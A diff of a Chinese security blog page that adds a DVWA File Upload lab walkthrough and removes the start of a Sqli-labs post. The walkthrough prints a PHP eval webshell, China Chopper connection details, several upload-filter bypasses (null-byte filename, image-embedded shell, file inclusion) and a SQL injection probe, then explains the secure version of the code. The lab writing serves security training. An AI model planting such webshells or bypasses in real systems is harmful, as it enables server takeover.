@@ -134,6 +134,150 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-DVWA 5-File Upload（文件上传）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/02/14/DVWA 5-File Upload（文件上传）/">DVWA 5-File Upload（文件上传）</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/02/14/DVWA 5-File Upload（文件上传）/" class="archive-article-date">
+  	<time datetime="2019-02-13T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-14</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="源码位置"><a href="#源码位置" class="headerlink" title="源码位置"></a>源码位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DVWA\vulnerabilities\upload\source\</span><br></pre></td></tr></table></figure>
+<h2 id="页面功能"><a href="#页面功能" class="headerlink" title="页面功能"></a>页面功能</h2><p>上传本地文件到服务器</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/5-1.png" alt="5-1"></p>
+<h2 id="Security-Level-—-Low"><a href="#Security-Level-—-Low" class="headerlink" title="Security Level — Low"></a>Security Level — Low</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">	$target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">	$target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">	<span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123;</span><br><span class="line">		<span class="comment">// No</span></span><br><span class="line">		$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Yes!</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>basename()</code>函数：返回路径中的文件名部分</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">basename ( string $path [, string $suffix ] ) : string</span><br><span class="line"></span><br><span class="line">path：一个路径。</span><br><span class="line">在 Windows 中，斜线（/）和反斜线（\）都可以用作目录分隔符。在其它环境下是斜线（/）。</span><br><span class="line"></span><br><span class="line">suffix：如果文件名是以 suffix 结束的，那这一部分也会被去掉。</span><br></pre></td></tr></table></figure>
+<p>从源码中可以看出，文件上传的位置为<code>根目录/hackable/uploads</code>，上传成功后会返回上传的路径，对上传的文件没有任何的限制。现在我们写一个一句话木马（muma.php），并将它上传</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&apos;muma&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以上传成功，并且返回信息<code>../../hackable/uploads/muma.php succesfully uploaded!</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/5-2.png" alt="5-2"></p>
+<p>现在我们就可以用菜刀去连接这个文件，可以连接成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">地址：http://192.168.0.105/dvwa/hackable/uploads/muma.php</span><br><span class="line">参数：muma</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/5-3.png" alt="5-3"></p>
+<p>并且可以使用服务器的<code>虚拟终端</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/5-4.png" alt="5-4"></p>
+<h2 id="Security-Level-—-Medium"><a href="#Security-Level-—-Medium" class="headerlink" title="Security Level — Medium"></a>Security Level — Medium</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">	$target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">	$target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// File information</span></span><br><span class="line">	$uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">	$uploaded_type = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ];</span><br><span class="line">	$uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Is it an image?</span></span><br><span class="line">	<span class="keyword">if</span>( ( $uploaded_type == <span class="string">"image/jpeg"</span> || $uploaded_type == <span class="string">"image/png"</span> ) &amp;&amp;</span><br><span class="line">		( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">		<span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123;</span><br><span class="line">			<span class="comment">// No</span></span><br><span class="line">			$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// Yes!</span></span><br><span class="line">			$html .= <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Invalid file</span></span><br><span class="line">		$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>本难度对上传的文件类型和大小做了限制，只能上传大小小于<code>100000B（约为97.6KB）</code>的<code>jpeg或png</code>图片。由于一句话木马体积非常小，所以大小方面定然没有问题，文件类型虽然做了限制，但还是有很多种绕过方法：</p>
+<p>1.直接修改上传文件的后缀</p>
+<p>内容不变，将文件的后缀更改为<code>.jpeg或.png</code>，照样上传成功</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/5-5.png" alt="5-5"></p>
+<p>但是此时用菜刀去连接却出了问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">地址：http://192.168.0.105/dvwa/hackable/uploads/muma.png</span><br><span class="line">参数：muma</span><br></pre></td></tr></table></figure>
+<p>无论进行什么操作都会出现如下的提示</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/5-6.png" alt="5-6"></p>
+<p>中国菜刀的原理是向上传文件发送包含<code>muma</code>参数的post请求，通过控制muma参数来执行不同的命令，而这里服务器将木马文件解析成了图片文件，因此向其发送post请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。</p>
+<p>那么如何让服务器将其解析为php文件呢？我们想到文件包含漏洞（详见<a href="https://knlvre.github.io/Knlvre.github-io/2019/02/13/DVWA%204-File%20Inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/">文件包含漏洞教程</a>）。这里可以借助Medium级别的文件包含漏洞来获取webshell权限，将菜刀的地址更改一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">地址：http://192.168.0.105/dvwa/vulnerabilities/fi/?page=http://tp://192.168.0.105/dvwa/hackable/uploads/muma.png</span><br><span class="line">参数：muma</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/5-7.png" alt="5-7"></p>
+<p>2.Burpsuit抓包修改文件类型和文件名</p>
+<p>先明确一点，源代码中<code>写文件内容</code>和<code>写文件名</code>是两个步骤，我们上传的本地文件可以任意命名，只要在抓包之后将其修改为<code>.php</code>就可以，下面看一下例子</p>
+<p>我们将刚才写的一句话木马命名为<code>Whatever</code>，并且清空上传目录下刚才上传的文件</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/5-8.png" alt="5-8"></p>
+<p>现在上传这个文件，并且用Burpsuit抓包，看一下请求</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/5-9.png" alt="5-9"></p>
+<p>修改圆圈中的两个地方，将文件名更改为<code>Whatever_muma.php</code>，将文件类型更改为<code>image/png</code>，发送请求看一下</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/5-10.png" alt="5-10"></p>
+<p>可以看到已经上传成功，现在我们到文件夹看一下上传的文件命名为什么</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/5-11.png" alt="5-11"></p>
+<p>果然如我们所料，文件名由在抓包的过程中修改的参数而决定，与文件本身文件名没有关系，现在菜刀直接连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">地址：http://192.168.0.105/dvwa/hackable/uploads/Whatever_muma.php</span><br><span class="line">参数：muma</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/5-12.png" alt="5-12"></p>
+<p>3.截断绕过规则</p>
+<p>在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断，所以可以把上传文件命名为Whatever.php%00.png</p>
+<p>上传文件并抓包，可以看到现在文件类型为image/png，可以通过文件类型检查</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/5-13.png" alt="5-13"></p>
+<p>上传成功，并且此时服务器会认为其文件名为hack.php，顺势解析为php文件</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/5-14.png" alt="5-14"></p>
+<h2 id="Security-Level-—-High"><a href="#Security-Level-—-High" class="headerlink" title="Security Level — High"></a>Security Level — High</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">	$target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">	$target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// File information</span></span><br><span class="line">	$uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">	$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>);</span><br><span class="line">	$uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line">	$uploaded_tmp  = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Is it an image?</span></span><br><span class="line">	<span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">"jpg"</span> || strtolower( $uploaded_ext ) == <span class="string">"jpeg"</span> || strtolower( $uploaded_ext ) == <span class="string">"png"</span> ) &amp;&amp;</span><br><span class="line">		( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">		getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">		<span class="keyword">if</span>( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;</span><br><span class="line">			<span class="comment">// No</span></span><br><span class="line">			$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// Yes!</span></span><br><span class="line">			$html .= <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Invalid file</span></span><br><span class="line">		$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>strrpos()</code>函数：计算指定字符串在目标字符串中最后一次出现的位置（返回 needle 存在的位置。如果没有找到，返回 FALSE）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">strrpos ( string $haystack , string $needle [, int $offset = 0 ] ) : int</span><br><span class="line"></span><br><span class="line">haystack：在此字符串中进行查找。</span><br><span class="line"></span><br><span class="line">needle：如果 needle不是一个字符串，它将被转换为整型并被视为字符的顺序值。</span><br><span class="line"></span><br><span class="line">offset：或许会查找字符串中任意长度的子字符串。负数值将导致查找在字符串结尾处开始的计数位置处结束。</span><br></pre></td></tr></table></figure>
+<p><code>getimagesize()</code>函数：取得图像大小</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getimagesize ( string $filename [, array &amp;$imageinfo ] ) : array</span><br><span class="line"></span><br><span class="line">如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生一条 E_WARNING 级的错误（函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错）</span><br></pre></td></tr></table></figure>
+<p>从源码中可以看出来，对文件类型的判断不再使用<code>$uploaded_type</code>参数，而是直接使用<code>$uploaded_name</code>参数，所以本难度如果只修改请求头中的<code>Content-Type</code>就没用了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/5-15.png" alt="5-15"></p>
+<p>并且如果像上一个难度那样只把文件后缀改为<code>.png</code>，如果文件本身没有图片的文件头和结构，照样报错，所以也是不可行的</p>
+<p>但是还是有方法的：通过<code>copy</code>命令，将一句话木马隐藏在图片里面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy png.png/b + php.php/a muma.png</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/5-16.png" alt="5-16"></p>
+<p>用WinHex打开看一下，其实就是在图片末尾写上一句话木马，这也就可以自己手动写</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/5-17.png" alt="5-17"></p>
+<p>用这个合成的图片去上传，果然可以上传成功，接下载就还是用<code>菜刀+文件包含</code>的方法去连接这个文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">地址：http://192.168.0.105/dvwa/vulnerabilities/fi/?page=http://tp://192.168.0.105/dvwa/hackable/uploads/muma.png</span><br><span class="line">参数：muma</span><br></pre></td></tr></table></figure>
+<h2 id="Security-Level-—-Impossible"><a href="#Security-Level-—-Impossible" class="headerlink" title="Security Level — Impossible"></a>Security Level — Impossible</h2><p>核心代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">	checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// File information</span></span><br><span class="line">	$uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">	$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>);</span><br><span class="line">	$uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line">	$uploaded_type = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ];</span><br><span class="line">	$uploaded_tmp  = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">	$target_path   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">'hackable/uploads/'</span>;</span><br><span class="line">	<span class="comment">//$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';</span></span><br><span class="line">	$target_file   =  md5( uniqid() . $uploaded_name ) . <span class="string">'.'</span> . $uploaded_ext;</span><br><span class="line">	$temp_file     = ( ( ini_get( <span class="string">'upload_tmp_dir'</span> ) == <span class="string">''</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="string">'upload_tmp_dir'</span> ) ) );</span><br><span class="line">	$temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . <span class="string">'.'</span> . $uploaded_ext;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Is it an image?</span></span><br><span class="line">	<span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">'jpg'</span> || strtolower( $uploaded_ext ) == <span class="string">'jpeg'</span> || strtolower( $uploaded_ext ) == <span class="string">'png'</span> ) &amp;&amp;</span><br><span class="line">		( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">		( $uploaded_type == <span class="string">'image/jpeg'</span> || $uploaded_type == <span class="string">'image/png'</span> ) &amp;&amp;</span><br><span class="line">		getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span></span><br><span class="line">		<span class="keyword">if</span>( $uploaded_type == <span class="string">'image/jpeg'</span> ) &#123;</span><br><span class="line">			$img = imagecreatefromjpeg( $uploaded_tmp );</span><br><span class="line">			imagejpeg( $img, $temp_file, <span class="number">100</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			$img = imagecreatefrompng( $uploaded_tmp );</span><br><span class="line">			imagepng( $img, $temp_file, <span class="number">9</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		imagedestroy( $img );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Can we move the file to the web root from the temp folder?</span></span><br><span class="line">		<span class="keyword">if</span>( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123;</span><br><span class="line">			<span class="comment">// Yes!</span></span><br><span class="line">			$html .= <span class="string">"&lt;pre&gt;&lt;a href='$&#123;target_path&#125;$&#123;target_file&#125;'&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// No</span></span><br><span class="line">			$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Delete any temp files</span></span><br><span class="line">		<span class="keyword">if</span>( file_exists( $temp_file ) )</span><br><span class="line">			unlink( $temp_file );</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Invalid file</span></span><br><span class="line">		$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>该难度中增加了<code>Anti-CSRF token</code>验证，并且对上传的文件名进行了<code>md5</code>加密（无法使用%00截断绕过规则），然后用<code>imagecreatefromjpeg()</code>函数提取图片的关键标识点，再用<code>imagejpeg()</code>重建图像，所以我们插入隐身在图片中的内容会被过滤掉，所以上传者无法上传恶意的文件，杜绝了文件上传漏洞</p>
+<hr>
+<p>参考文章：</p>
+<p><a href="https://www.freebuf.com/articles/web/119467.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/119467.html</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">DVWA</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/02/14/DVWA 5-File Upload（文件上传）/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-DVWA 4-File Inclusion（文件包含）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1369,294 +1513,6 @@
 
 
   
-    <article id="post-Sqli-labs 第1-10关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/01/29/Sqli-labs 第1-10关/">Sqli-labs(第1-10关)</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/01/29/Sqli-labs 第1-10关/" class="archive-article-date">
-  	<time datetime="2019-01-28T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-29</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前就有学习过一些关卡，但是由于当时没有搭建博客的想法，所以也就没有写下来属于自己的笔记。现在博客搭建完成了，从第一关开始，重新写下所有关卡的笔记，并且向后学习。</p>
-<p>关于SQL注入的基础知识，可以看我自己整理的文章：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/28/Sqli-labs%20Tips/">Sqli-labs Tips</a></p>
-<h2 id="数据库名、表名、列名"><a href="#数据库名、表名、列名" class="headerlink" title="数据库名、表名、列名"></a>数据库名、表名、列名</h2><p>因为是学习用的，所以先告诉大家这个基于<strong>phpstudy</strong>搭建的<strong>sqli-labs</strong>学习过程中，较频繁使用的重要的数据库名、表名、列名：</p>
-<p>数据库名：security</p>
-<p>security下的表名：emails，referers，uagents，users</p>
-<p>users下的列名：id，username，password</p>
-<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less - 1"></a>Less - 1</h2><p>构造URL，传入<strong>id</strong>参数，赋值为<strong>1’</strong>，进行尝试。ps：注意后面这个<strong>单引号</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos;</span><br></pre></td></tr></table></figure>
-<p>回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对<strong>ID</strong>这个参数的处理</p>
